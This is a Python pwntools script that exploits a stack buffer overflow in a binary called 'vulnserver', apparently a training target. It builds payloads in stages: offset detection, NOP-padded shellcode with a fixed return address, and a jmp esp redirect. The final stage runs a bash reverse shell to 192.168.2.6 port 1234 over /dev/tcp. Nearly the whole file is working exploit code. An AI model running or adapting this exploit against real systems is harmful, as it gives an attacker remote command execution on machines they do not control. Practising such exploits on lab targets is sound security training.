from pwn import args, asm, shellcraft, context, ELF, connect

cmd = b'OVERFLOW '
host = args.HOST or '0.0.0.0'
port = int(args.PORT or 1337)

def craft_payload() -> bytes:
  '''
  Payloads used in each stage of the analysis process
  '''
  nop_padding = asm(shellcraft.nop())
  if args.STAGE == 'dynamic detection':
    # Here analyze the stack to identify where the bytes are placed
    payload = b'A'*27 + b'BBCCDDEE'

  elif args.STAGE == 'exploitation 1' :
    # Here tried to exploit the vulnerability and discover the real working
    # of the binary
    shellcode = asm(shellcraft.sh())
    return_addr = (0xffaaea48).to_bytes(4, 'little')
    number_nops = 44 - len(cmd) - len(shellcode)
    payload = nop_padding * number_nops + shellcode + return_addr

  elif args.STAGE == 'exploitation 2' :
    # Here re order the payload and use the jmpesp address
    # But it open the shell in the terminal where the binary is
    # execute it instead where the script runs.
    shellcode = asm(shellcraft.sh())

  elif args.STAGE == 'exploitation 3':
    # Here exploit the binary after the learned in the previous stage
    argv = ["/bin/bash", "-c", "bash -i >& /dev/tcp/192.168.2.6/1234 0>&1"]
    shellcode = asm(shellcraft.execve(path = argv[0], argv = argv))

  if args.STAGE in ['exploitation 2','exploitation 3'] :
    jmp_esp = (0x804929a).to_bytes(4, 'little')
    return_addr = jmp_esp
    number_nops = 44 - len(cmd)
    payload = nop_padding * number_nops + return_addr + shellcode

  payload = cmd + payload

  return payload

def main() -> None :
  context.binary = ELF('vulnserver')
  io = connect(host, port)
  payload = craft_payload()
  _ = input("Send payload? [enter to continue]: ")
  io.sendline(payload)
  io.interactive()

if __name__ == '__main__':
  main()
